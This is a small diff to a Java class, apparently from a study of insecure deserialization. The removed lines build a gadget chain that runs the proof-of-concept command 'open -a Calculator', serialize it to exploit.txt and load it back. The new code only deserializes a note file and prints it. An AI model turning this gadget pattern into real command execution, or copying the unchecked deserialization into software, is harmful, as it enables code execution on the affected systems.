@@ -32,11 +32,12 @@ public class Main3 {
     }
 
     public static void main(String[] args) throws Exception {
-        TaskExecutor te = new TaskExecutor();
-        CommandTask ct = new CommandTask(te, "open -a Calculator");
-        CacheManager cm = new CacheManager(ct, "macOS", 0);
+//        TaskExecutor te = new TaskExecutor();
+//        CommandTask ct = new CommandTask(te, "open -a Calculator");
+//        CacheManager cm = new CacheManager(ct, "macOS", 0);
 
-        save("exploit.txt", cm);
-        load("exploit.txt");
+//        save("exploit.txt", cm);
+        Object o = load("my_note.txt");
+        System.out.println(o);
     }
 }
